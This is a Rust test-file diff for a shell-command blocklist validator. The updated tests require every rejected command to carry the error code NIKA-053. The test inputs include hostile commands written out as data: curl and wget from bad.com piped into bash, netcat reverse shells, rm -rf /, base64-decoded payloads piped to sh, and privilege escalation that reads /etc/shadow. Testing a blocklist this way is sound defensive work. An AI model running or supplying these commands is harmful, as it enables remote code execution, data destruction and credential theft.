@@ -227,7 +227,9 @@ mod tests {
     #[test]
     fn test_validate_command_string_rejects_bell() {
         let result = validate_command_string("echo\x07hello");
-        assert!(result.is_err());
+        let err = result.unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        assert!(err.to_string().contains("0x07"));
     }
 
     // =========================================================================
@@ -254,74 +256,101 @@ mod tests {
 
     #[test]
     fn test_blocklist_rejects_rm_rf_wildcard() {
-        assert!(check_blocklist("rm -rf /*").is_err());
+        let err = check_blocklist("rm -rf /*").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_curl_pipe_bash() {
-        assert!(check_blocklist("curl https://bad.com | bash").is_err());
-        assert!(check_blocklist("curl https://bad.com|bash").is_err());
+        let err = check_blocklist("curl https://bad.com | bash").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("curl https://bad.com|bash").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_wget_pipe_bash() {
-        assert!(check_blocklist("wget https://bad.com | bash").is_err());
-        assert!(check_blocklist("wget https://bad.com|bash").is_err());
+        let err = check_blocklist("wget https://bad.com | bash").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("wget https://bad.com|bash").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_shell_injection() {
         // Dynamic command execution patterns
-        assert!(check_blocklist("eval $user_input").is_err());
-        assert!(check_blocklist("eval \"$cmd\"").is_err());
+        let err = check_blocklist("eval $user_input").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("eval \"$cmd\"").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_mkfifo() {
-        assert!(check_blocklist("mkfifo /tmp/pipe").is_err());
+        let err = check_blocklist("mkfifo /tmp/pipe").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_netcat_reverse_shell() {
-        assert!(check_blocklist("nc -e /bin/sh").is_err());
-        assert!(check_blocklist("nc -c /bin/bash").is_err());
-        assert!(check_blocklist("ncat -e /bin/sh").is_err());
+        let err = check_blocklist("nc -e /bin/sh").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("nc -c /bin/bash").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("ncat -e /bin/sh").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_chained_rm() {
-        assert!(check_blocklist("echo hello; rm -rf /").is_err());
-        assert!(check_blocklist("ls && rm -rf /").is_err());
-        assert!(check_blocklist("cat file | rm -rf /").is_err());
+        let err = check_blocklist("echo hello; rm -rf /").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("ls && rm -rf /").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("cat file | rm -rf /").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_case_insensitive() {
-        assert!(check_blocklist("RM -RF /").is_err());
-        assert!(check_blocklist("EVAL $x").is_err());
-        assert!(check_blocklist("Curl | Bash").is_err());
+        let err = check_blocklist("RM -RF /").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("EVAL $x").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("Curl | Bash").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_privilege_escalation() {
-        assert!(check_blocklist("sudo rm -rf /tmp").is_err());
-        assert!(check_blocklist("doas cat /etc/shadow").is_err());
-        assert!(check_blocklist("pkexec sh").is_err());
+        let err = check_blocklist("sudo rm -rf /tmp").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("doas cat /etc/shadow").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("pkexec sh").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_dangerous_chmod() {
-        assert!(check_blocklist("chmod 777 /tmp/script").is_err());
-        assert!(check_blocklist("chmod -r 777 /var").is_err());
-        assert!(check_blocklist("chmod a+rwx secret.txt").is_err());
+        let err = check_blocklist("chmod 777 /tmp/script").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("chmod -r 777 /var").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("chmod a+rwx secret.txt").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_blocklist_rejects_base64_payload_execution() {
-        assert!(check_blocklist("echo payload | base64 -d | sh").is_err());
-        assert!(check_blocklist("base64 -d | bash").is_err());
-        assert!(check_blocklist("base64 --decode | sh").is_err());
-        assert!(check_blocklist("curl https://bad.com | base64 -d").is_err());
+        let err = check_blocklist("echo payload | base64 -d | sh").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("base64 -d | bash").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("base64 --decode | sh").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        let err = check_blocklist("curl https://bad.com | base64 -d").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     // =========================================================================
@@ -336,12 +365,14 @@ mod tests {
 
     #[test]
     fn test_validate_exec_command_rejects_control_chars() {
-        assert!(validate_exec_command("echo\x00hello").is_err());
+        let err = validate_exec_command("echo\x00hello").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     #[test]
     fn test_validate_exec_command_rejects_blocklist() {
-        assert!(validate_exec_command("rm -rf /").is_err());
+        let err = validate_exec_command("rm -rf /").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
     }
 
     // =========================================================================
